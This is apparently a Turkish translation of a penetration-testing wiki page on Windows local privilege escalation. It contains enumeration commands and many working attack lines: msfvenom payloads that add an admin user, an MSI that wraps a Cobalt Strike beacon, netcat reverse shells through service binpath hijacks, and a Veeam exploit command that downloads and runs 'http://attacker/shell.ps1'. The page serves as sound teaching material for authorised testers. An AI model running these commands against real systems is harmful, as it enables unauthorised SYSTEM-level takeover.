# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows yerel privilege escalation vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows Başlangıç Teorisi

### Access Tokens

**Windows Access Tokens nedir bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs hakkında daha fazla bilgi için aşağıdaki sayfayı kontrol edin:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows'ta integrity levels nedir bilmiyorsanız devam etmeden önce aşağıdaki sayfayı okumalısınız:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows'ta sistemin **enumeration**'unu engelleyebilecek, executable çalıştırmanızı önleyebilecek veya hatta **aktivitelerinizi tespit edebilecek** farklı şeyler vardır. privilege escalation enumeration işlemine başlamadan önce bu **defense** **mechanism**'lerini **okumalı** ve hepsini **enumerate** etmelisiniz:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` üzerinden başlatılan UIAccess process'leri, AppInfo secure-path kontrolleri bypass edildiğinde herhangi bir prompt olmadan High IL seviyesine ulaşmak için abuse edilebilir. Dedicated UIAccess/Admin Protection bypass workflow için buraya bakın:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation, arbitrary bir SYSTEM registry write (RegPwn) için abuse edilebilir:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Son Windows build'leri ayrıca, ayrıcalıklı bir local NTLM authentication'ın yeniden kullanılan bir SMB TCP connection üzerinden reflected edildiği **SMB arbitrary-port** LPE path'ini de ekledi:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Windows sürümünde bilinen bir vulnerability olup olmadığını kontrol edin (uygulanan patches'i de kontrol edin).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Bu [site](https://msrc.microsoft.com/update-guide/vulnerability), Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için kullanışlıdır. Bu veritabanında 4.700’den fazla güvenlik açığı bulunur; bu da bir Windows ortamının sunduğu **devasa saldırı yüzeyini** gösterir.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas içinde watson gömülü olarak bulunur)_

**Sistem bilgileriyle yerel olarak**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit'lerin Github depoları:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Env değişkenlerinde kayıtlı herhangi bir credential/Juicy bilgi var mı?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geçmişi
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript dosyaları

Bunu nasıl açacağınızı şurada öğrenebilirsiniz: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları kaydedilir; yürütülen komutlar, komut çağrıları ve betiklerin bazı bölümleri buna dahildir. Ancak, tam yürütme ayrıntıları ve çıktı sonuçları yakalanmayabilir.

Bunu etkinleştirmek için, dokümantasyondaki "Transcript files" bölümündeki talimatları izleyin ve **"Powershell Transcription"** yerine **"Module Logging"** seçin.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell loglarından son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Betik'in yürütülmesinin tam etkinlik ve tam içerik kaydı yakalanır, böylece her kod bloğunun çalışırken belgelenmesi sağlanır. Bu süreç, her etkinliğin kapsamlı bir denetim izini korur; bu da adli analiz ve kötü amaçlı davranışların incelenmesi için değerlidir. Tüm etkinliklerin yürütme anında belgelenmesiyle, süreç hakkında ayrıntılı içgörüler sağlanır.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block için loglama olayları, Windows Event Viewer içinde şu yolda bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### İnternet Ayarları
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Sürücüler
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Güncellemeler http**S** yerine http kullanılarak istenmiyorsa sistemi ele geçirebilirsiniz.

Aşağıdakini cmd içinde çalıştırarak ağın SSL olmayan bir WSUS güncellemesi kullanıp kullanmadığını kontrol ederek başlarsınız:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Veya PowerShell'de şu şekilde:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Şu yanıtlardan biri gibi bir yanıt alırsanız:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Ve `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ya da `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise.

O zaman, **istismar edilebilir.** Son registry değeri `0` ise, WSUS girdisi yok sayılır.

Bu zafiyetleri istismar etmek için şu araçları kullanabilirsiniz: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Bunlar, SSL olmayan WSUS trafiğine 'fake' güncellemeler enjekte etmek için MiTM silahlandırılmış exploit scriptleridir.

Araştırmayı burada okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Tam raporu burada okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Temelde, bu bug'ın istismar ettiği kusur budur:

> Eğer yerel kullanıcı proxy'mizi değiştirme yetkimiz varsa ve Windows Updates Internet Explorer ayarlarında yapılandırılan proxy'yi kullanıyorsa, bu durumda kendi trafiğimizi yerel olarak yakalamak ve varlığımız üzerinde yükseltilmiş bir kullanıcı olarak kod çalıştırmak için [PyWSUS](https://github.com/GoSecure/pywsus) çalıştırma yetkimiz de vardır.
>
> Ayrıca, WSUS servisi mevcut kullanıcının ayarlarını kullandığı için certificate store'unu da kullanacaktır. WSUS hostname'i için self-signed bir certificate üretir ve bu certificate'i mevcut kullanıcının certificate store'una eklerseniz, hem HTTP hem de HTTPS WSUS trafiğini yakalayabiliriz. WSUS, certificate üzerinde trust-on-first-use türü bir doğrulama uygulamak için HSTS-benzeri mekanizmalar kullanmaz. Sunulan certificate kullanıcı tarafından trusted ise ve doğru hostname'e sahipse, servis tarafından kabul edilir.

Bu zafiyeti [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla istismar edebilirsiniz (liberated olduktan sonra).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Birçok enterprise agent, localhost IPC yüzeyi ve yetkili bir update channel sunar. Enrollment saldırgan sunucusuna yönlendirilebiliyorsa ve updater rogue root CA'ya veya zayıf signer kontrollerine güveniyorsa, yerel bir kullanıcı SYSTEM servisinin kuracağı kötü amaçlı bir MSI teslim edebilir. Netskope stAgentSvc zincirine dayanan genelleştirilmiş bir tekniği (CVE-2025-0309) burada görün:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261`, saldırgan tarafından kontrol edilen mesajları işleyen **TCP/9401** üzerinde bir localhost servisi açar ve **NT AUTHORITY\SYSTEM** olarak keyfi komutların çalıştırılmasına izin verir.

- **Recon**: dinleyiciyi ve sürümü doğrulayın, örn. `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: gerekli Veeam DLL'leriyle birlikte `VeeamHax.exe` gibi bir PoC'yi aynı dizine yerleştirin, ardından yerel socket üzerinden bir SYSTEM payload tetikleyin:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Hizmet komutu SYSTEM olarak çalıştırır.
## KrbRelayUp

Windows **domain** ortamlarında belirli koşullar altında bir **local privilege escalation** açığı vardır. Bu koşullar, **LDAP signing**'in zorunlu kılınmadığı ortamları, kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırmalarına izin veren self-rights sahip olmalarını ve kullanıcıların domain içinde bilgisayar oluşturabilme yeteneğini içerir. Bu **gereksinimlerin** varsayılan ayarlarla karşılandığını belirtmek önemlidir.

**Exploit**'i [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) içinde bulun

Saldırı akışı hakkında daha fazla bilgi için [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) adresine bakın

## AlwaysInstallElevated

Eğer bu 2 register etkinse (değer **0x1** ise), herhangi bir yetkiye sahip kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **install** (çalıştır) edebilir.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Eğer bir meterpreter oturumunuz varsa bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz

### PowerUP

Mevcut dizin içinde bir Windows MSI binary oluşturmak için power-up içindeki `Write-UserAddMSI` komutunu kullanın; bu, ayrıcalıkları yükseltmek için kullanılır. Bu script, kullanıcı/grup ekleme isteği veren önceden derlenmiş bir MSI installer yazar (bu yüzden GIU erişimine ihtiyacınız olacak):
```
Write-UserAddMSI
```
Sadece oluşturulan binary’yi çalıştırarak yetkileri yükseltin.

### MSI Wrapper

Bu araçları kullanarak bir MSI wrapper oluşturmayı öğrenmek için bu eğitimi okuyun. Sadece komut satırlarını **çalıştırmak** istiyorsanız bir "**.bat**" dosyasını da wrap edebileceğinizi unutmayın


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX ile MSI Oluşturma


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio ile MSI Oluşturma

- **Cobalt Strike** veya **Metasploit** ile `C:\privesc\beacon.exe` içinde **yeni bir Windows EXE TCP payload** oluşturun
- **Visual Studio**’yu açın, **Create a new project** seçin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçin ve **Next**’e tıklayın.
- Projeye **AlwaysPrivesc** gibi bir ad verin, konum için **`C:\privesc`** kullanın, **place solution and project in the same directory** seçeneğini seçin ve **Create**’e tıklayın.
- 4 adımın 3. adımına gelene kadar **Next**’e tıklamaya devam edin (include edilecek dosyaları seçin). **Add**’e tıklayın ve az önce oluşturduğunuz Beacon payload’ını seçin. Ardından **Finish**’e tıklayın.
- **Solution Explorer** içinde **AlwaysPrivesc** projesini seçin ve **Properties** bölümünde **TargetPlatform** değerini **x86**’dan **x64**’e değiştirin.
- **Author** ve **Manufacturer** gibi değiştirebileceğiniz başka özellikler de vardır; bunlar kurulan uygulamanın daha meşru görünmesini sağlayabilir.
- Projeye sağ tıklayın ve **View > Custom Actions** seçin.
- **Install** üzerine sağ tıklayın ve **Add Custom Action** seçin.
- **Application Folder** üzerine çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**’e tıklayın. Bu, installer çalıştırılır çalıştırılmaz beacon payload’ının çalıştırılmasını sağlar.
- **Custom Action Properties** altında **Run64Bit** değerini **True** yapın.
- Son olarak, **build it**.
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı gösterilirse, platformu x64 olarak ayarladığınızdan emin olun.

### MSI Kurulumu

Kötü amaçlı `.msi` dosyasının **kurulumunu** arka planda çalıştırmak için:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Bu vulnerability'yi istismar etmek için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

Bu ayarlar neyin **loglandığını** belirler, bu yüzden dikkat etmelisiniz
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, logların nereye gönderildiğini bilmek ilginçtir
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** , **local Administrator parolalarının yönetimi** için tasarlanmıştır; etki alanına katılmış bilgisayarlarda her parolanın **benzersiz, rastgeleleştirilmiş ve düzenli olarak güncellenmiş** olmasını sağlar. Bu parolalar Active Directory içinde güvenli şekilde saklanır ve yalnızca ACL'ler aracılığıyla yeterli izin verilmiş kullanıcılar tarafından erişilebilir; böylece yetkiliyse local admin parolalarını görüntüleyebilirler.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Eğer aktifse, **düz metin parolalar LSASS** (Local Security Authority Subsystem Service) içinde saklanır.\
[**Bu sayfada WDigest hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** ile başlayan Microsoft, Local Security Authority (LSA) için güvenilmeyen işlemlerin **belleğini okuma** veya kod enjekte etme girişimlerini **engellemek** amacıyla geliştirilmiş koruma getirdi ve sistemi daha da güvence altına aldı.\
[**LSA Protection hakkında daha fazla bilgi burada**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** **Windows 10**'da tanıtıldı. Amacı, bir cihazda depolanan kimlik bilgilerini pass-the-hash saldırıları gibi tehditlere karşı korumaktır.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Önbelleğe Alınmış Kimlik Bilgileri

**Domain credentials** **Local Security Authority** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir security package tarafından doğrulandığında, genellikle kullanıcı için domain credentials oluşturulur.\
[**Cached Credentials hakkında daha fazla bilgi burada**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Users & Groups

### Kullanıcıları & Grupları Listele

Ait olduğun gruplardan herhangi birinin ilginç izinleri olup olmadığını kontrol etmelisin
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Ayrıcalıklı gruplar

Eğer **bazı ayrıcalıklı grupların üyesiyseniz, yetkileri yükseltebilirsiniz**. Ayrıcalıklı gruplar hakkında bilgi edinin ve ayrıcalık yükseltmek için bunları nasıl kötüye kullanabileceğinizi burada öğrenin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipülasyonu

**Token**ın ne olduğu hakkında daha fazla bilgi edinmek için bu sayfaya bakın: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
**İlginç tokenlar** hakkında bilgi edinmek ve bunları nasıl kötüye kullanacağınızı öğrenmek için şu sayfayı kontrol edin:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Oturum açmış kullanıcılar / Oturumlar
```bash
qwinsta
klist sessions
```
### Ana klasörler
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Parola Politikası
```bash
net accounts
```
### Clipboard içeriğini al
```bash
powershell -command "Get-Clipboard"
```
## Çalışan Process'ler

### Dosya ve Klasör İzinleri

Her şeyden önce, process'leri listelerken **process'in command line'ında şifre olup olmadığını kontrol edin**.\
Bazı çalışan binary'leri **üzerine yazabiliyor musunuz** veya olası [**DLL Hijacking attacks**](dll-hijacking/index.html) için binary klasörüne yazma izniniz olup olmadığını kontrol edin:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Her zaman çalışan olası [**electron/cef/chromium debuggers**](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md) olup olmadığını kontrol edin, bunu yetkileri yükseltmek için kötüye kullanabilirsiniz.

**İşlemlerin binary’lerinin izinlerini kontrol etme**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Süreçlerin binary’lerinin klasörlerinin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Çalışan bir process’in memory dump’ını **procdump** ile sysinternals’tan oluşturabilirsiniz. FTP gibi service’ler **credentials’ı memory’de clear text olarak** tutar, memory’yi dump etmeyi deneyin ve credentials’ı okuyun.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**SYSTEM olarak çalışan Applications, bir user’ın CMD başlatmasına veya dizinlere göz atmasına izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" için arama yapın, "Click to open Command Prompt" üzerine tıklayın

## Services

Service Triggers, Windows’un belirli koşullar oluştuğunda bir service başlatmasına izin verir (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, vb.). SERVICE_START rights olmadan bile, çoğu zaman trigger’larını tetikleyerek privileged services başlatabilirsiniz. Enumeration ve activation techniques için şuraya bakın:

-
{{#ref}}
service-triggers.md
{{#endref}}

Get a list of services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### İzinler

Bir servis hakkında bilgi almak için **sc** kullanabilirsiniz
```bash
sc qc <service_name>
```
Her bir servis için gerekli yetki seviyesini kontrol etmek amacıyla _Sysinternals_ içindeki **accesschk** binary’sini bulundurmanız önerilir.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users" herhangi bir service'i değiştirebiliyor mu diye kontrol edilmesi önerilir:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP için accesschk.exe dosyasını buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Servisi etkinleştir

Eğer bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Bunu kullanarak etkinleştirebilirsiniz
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**XP SP1 için upnphost hizmetinin çalışmak için SSDPSRV’ye bağlı olduğunu dikkate alın**

**Bu sorunun başka bir geçici çözümü** şu komutu çalıştırmaktır:
```
sc.exe config usosvc start= auto
```
### **Service binary path'ini değiştir**

"Authenticated users" grubunun bir servis üzerinde **SERVICE_ALL_ACCESS** yetkisine sahip olduğu senaryoda, servisin çalıştırılabilir binary'sini değiştirmek mümkündür. **sc**'yi değiştirmek ve çalıştırmak için:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Servisi yeniden başlat
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Ayrıcalıklar çeşitli izinler üzerinden yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Servis binary’sinin yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını sağlar; bu da service configurations değiştirme yeteneğine yol açar.
- **WRITE_OWNER**: Sahiplik edinmeye ve izinlerin yeniden yapılandırılmasına izin verir.
- **GENERIC_WRITE**: Service configurations değiştirme yeteneğini devralır.
- **GENERIC_ALL**: Ayrıca service configurations değiştirme yeteneğini devralır.

Bu zafiyetin tespiti ve exploitation için _exploit/windows/local/service_permissions_ kullanılabilir.

### Services binaries weak permissions

**Bir service tarafından çalıştırılan binary’yi değiştirebiliyor musun** ya da binary’nin bulunduğu klasör üzerinde **write permissions** var mı kontrol et ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
**wmic** kullanarak bir service tarafından çalıştırılan her binary’yi bulabilir (system32 içinde olmayanlar) ve **icacls** ile izinlerini kontrol edebilirsin:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ayrıca **sc** ve **icacls** da kullanabilirsiniz:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Hizmetler registry değiştirme izinleri

Herhangi bir service registry'yi değiştirebilir misiniz diye kontrol etmelisiniz.\
Bir service **registry** üzerindeki **izinlerinizi** şu şekilde **kontrol** edebilirsiniz:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** için `FullControl` izinlerinin olup olmadığı kontrol edilmelidir. Eğer varsa, service tarafından çalıştırılan binary değiştirilebilir.

Çalıştırılan binary’nin Path’ini değiştirmek için:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Bazı Windows Accessibility özellikleri, daha sonra bir **SYSTEM** işlemi tarafından bir HKLM session key içine kopyalanan kullanıcı bazlı **ATConfig** key’leri oluşturur. Bir registry **symbolic link race** bu ayrıcalıklı yazmayı **herhangi bir HKLM path**’ine yönlendirebilir ve böylece arbitrary HKLM **value write** primitive’i sağlar.

Ana konumlar (örnek: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` yüklü accessibility özelliklerini listeler.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` kullanıcı kontrollü yapılandırmayı saklar.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` logon/secure-desktop geçişleri sırasında oluşturulur ve kullanıcı tarafından yazılabilir.

Kötüye kullanım akışı (CVE-2026-24291 / ATConfig):

1. SYSTEM tarafından yazılmasını istediğiniz **HKCU ATConfig** value’sunu doldurun.
2. secure-desktop kopyasını tetikleyin (ör. **LockWorkstation**), bu da AT broker akışını başlatır.
3. **Yarışı kazanın**: `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` üzerinde bir **oplock** koyun; oplock tetiklendiğinde **HKLM Session ATConfig** key’ini korunmuş bir HKLM hedefine işaret eden bir **registry link** ile değiştirin.
4. SYSTEM, saldırganın seçtiği value’yu yönlendirilmiş HKLM path’ine yazar.

Arbitrary HKLM value write elde ettikten sonra, service configuration value’larını overwrite ederek LPE’ye geçiş yapın:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

